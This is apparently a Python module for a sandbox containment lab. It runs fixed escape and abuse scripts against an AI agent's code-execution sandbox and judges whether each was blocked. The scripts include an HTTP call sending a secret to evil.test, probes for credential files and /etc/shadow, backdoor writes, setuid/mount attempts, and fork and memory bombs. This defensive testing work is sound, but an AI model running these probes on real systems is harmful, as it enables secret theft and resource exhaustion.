"""Containment Lab: a fixed set of REAL escape/abuse attempts, executed inside the production sandbox.

Each attack is a Python script run exactly like the agent's run_python tool (fresh container, no network,
cap-drop ALL, read-only fs, 256 MB, pids limit, timeout, destroyed afterwards; gVisor when SANDBOX_RUNTIME=runsc).
Scripts print "ESCAPED: ..." if the dangerous thing actually worked and "BLOCKED: ..." with the evidence otherwise.
The verdict is computed here from the result; no LLM is involved, and clients can only pick an attack by id,
never submit code.
"""
from __future__ import annotations

from dataclasses import dataclass, replace
from typing import Any, Literal, Optional

from pydantic import BaseModel

from .sandbox import SANDBOX_ARGV, DockerSandbox, SandboxConfig, SandboxResult

Status = Literal["contained", "escaped", "inconclusive", "unavailable"]
LAB_TIMEOUT_S = 10.0  # shorter than production's 20 s so the lab responds quickly; shown in the UI


@dataclass(frozen=True)
class LabAttack:
    id: str
    title: str
    goal: str
    expect: Literal["marker", "killed", "timeout"]
    code: str


NET = '''import socket, urllib.request
out = []
for host, port in (("evil.test", 80), ("1.1.1.1", 443), ("8.8.8.8", 53)):
    try:
        s = socket.create_connection((host, port), timeout=3); s.close()
        print("ESCAPED: connected to", host, port)
    except Exception as e:
        out.append(f"{host}:{port} -> {type(e).__name__}: {e}")
try:
    urllib.request.urlopen("http://evil.test/collect?d=SECRET", timeout=3)
    print("ESCAPED: http request completed")
except Exception as e:
    out.append(f"http -> {type(e).__name__}")
print("BLOCKED: " + " | ".join(out))
'''

SECRETS = '''import os
seen = [p for p in ("/workspace/.env", "/workspace/secrets/aws.txt", "/var/run/docker.sock", "/run/secrets", "/root/.ssh/id_rsa") if os.path.exists(p)]
if seen:
    print("ESCAPED: host paths visible:", seen)
leaky = [k for k in os.environ if any(w in k.upper() for w in ("KEY", "TOKEN", "SECRET", "PASSWORD"))]
if leaky:
    print("ESCAPED: secret-looking env vars inside sandbox:", leaky)
try:
    open("/etc/shadow").read(); print("ESCAPED: read /etc/shadow")
except Exception as e:
    print("BLOCKED: no host secrets visible; /etc/shadow ->", type(e).__name__)
'''

FS_WRITE = '''import os, subprocess
res = []
for p in ("/etc/pwned", "/usr/local/bin/backdoor", "/pwned", "/srv/x"):
    try:
        open(p, "w").write("x"); print("ESCAPED: wrote", p)
    except Exception as e:
        res.append(f"{p} -> {type(e).__name__}")
p = "/tmp/payload.sh"
open(p, "w").write("#!/bin/sh\\necho PWNED\\n"); os.chmod(p, 0o755)
try:
    r = subprocess.run([p], capture_output=True, text=True, timeout=5)
    print("ESCAPED: payload executed from /tmp" if "PWNED" in r.stdout else "noexec: ran without output")
except Exception as e:
    res.append(f"exec /tmp/payload.sh -> {type(e).__name__}")
print("BLOCKED: " + " | ".join(res))
'''

PRIV = '''import os, ctypes
res = []
try:
    os.setuid(0); print("ESCAPED: setuid(0) worked, uid", os.getuid())
except Exception as e:
    res.append(f"setuid(0) -> {type(e).__name__}")
libc = ctypes.CDLL(None, use_errno=True)
if libc.mount(b"none", b"/tmp", b"tmpfs", 0, None) == 0:
    print("ESCAPED: mount() succeeded")
else:
    res.append("mount -> " + os.strerror(ctypes.get_errno()))
print("running as uid", os.getuid())
print("BLOCKED: " + " | ".join(res))
'''

MEMORY = '''chunks, mb = [], 0
while mb < 2048:
    chunks.append(bytearray(b"x") * (32 * 1024 * 1024)); mb += 32
    print(f"allocated {mb} MB", flush=True)
    if mb >= 1024:
        print("ESCAPED: allocated 1 GB beyond the 256 MB limit")
'''

FORK = '''import os, time
kids = 0
try:
    for _ in range(400):
        pid = os.fork()
        if pid == 0:
            time.sleep(3); os._exit(0)
        kids += 1
except OSError as e:
    print(f"BLOCKED: fork failed after {kids} children: {e}")
else:
    print(f"ESCAPED: forked {kids} processes")
'''

HANG = '''print("spinning forever...", flush=True)
while True:
    pass
'''

ATTACKS: list[LabAttack] = [
    LabAttack("net_exfil", "Network exfiltration", "Open sockets and HTTP requests to evil.test and public IPs.", "marker", NET),
    LabAttack("host_secrets", "Reach host secrets", "Find the .env, docker.sock, /run/secrets, env vars or /etc/shadow.", "marker", SECRETS),
    LabAttack("fs_write", "Write system files / run dropped payload", "Write to /etc, /usr/local/bin and execute a script dropped in /tmp.", "marker", FS_WRITE),
    LabAttack("priv_esc", "Privilege escalation", "setuid(0) and the mount() syscall.", "marker", PRIV),
    LabAttack("fork_storm", "Fork storm", "Spawn 400 processes to exhaust the host.", "marker", FORK),
    LabAttack("memory_bomb", "Memory bomb", "Allocate up to 2 GB against a 256 MB limit.", "killed", MEMORY),
    LabAttack("cpu_hang", "Infinite loop", "Spin forever to hold the sandbox.", "timeout", HANG),
]
BY_ID = {a.id: a for a in ATTACKS}


class LabResult(BaseModel):
    id: str
    title: str
    status: Status
    evidence: str
    exit_code: int
    duration_s: float
    runtime: str
    timeout_s: float


def lab_sandbox(env: Optional[dict] = None) -> DockerSandbox:
    cfg = SandboxConfig.from_env(env)
    return DockerSandbox(replace(cfg, timeout_s=min(cfg.timeout_s, LAB_TIMEOUT_S)))


def _tail(s: str, n: int = 500) -> str:
    s = s.strip()
    return s if len(s) <= n else "…" + s[-n:]


def judge(attack: LabAttack, res: SandboxResult) -> tuple[Status, str]:
    out = (res.stdout or "")
    both = out + "\n" + (res.stderr or "")
    if res.infra_error:
        return "unavailable", _tail(res.stderr or "docker unavailable")
    escaped = [ln for ln in out.splitlines() if ln.startswith("ESCAPED")]
    if escaped:
        return "escaped", escaped[0]
    if attack.expect == "marker":
        line = next((ln for ln in out.splitlines() if ln.startswith("BLOCKED")), "")
        return ("contained", line) if line else ("inconclusive", _tail(both))
    if attack.expect == "killed":
        if res.killed or "MemoryError" in both:
            return "contained", f"killed by the memory limit (exit {res.exit_code}) after: {_tail(out, 60).splitlines()[-1] if out.strip() else 'start'}"
        return "inconclusive", _tail(both)
    if res.timed_out:  # expect == "timeout"
        return "contained", f"killed after the {res.duration_s:g}s timeout and the container destroyed"
    return "inconclusive", _tail(both)


def run_lab_attack(sb: Any, attack: LabAttack) -> LabResult:
    res = sb.run(SANDBOX_ARGV, stdin=attack.code)
    status, evidence = judge(attack, res)
    return LabResult(id=attack.id, title=attack.title, status=status, evidence=evidence, exit_code=res.exit_code,
                     duration_s=res.duration_s, runtime=sb.cfg.runtime or "runc", timeout_s=sb.cfg.timeout_s)


def kernel_view(sb: Any) -> dict:
    """What the sandboxed process sees as its kernel. Under gVisor this is gVisor's own synthetic kernel log."""
    res = sb.run(["sh", "-c", "uname -a; echo; dmesg 2>&1 | head -15"])
    return {"runtime": sb.cfg.runtime or "runc", "output": _tail(res.stdout + res.stderr, 1500),
            "available": not res.infra_error}
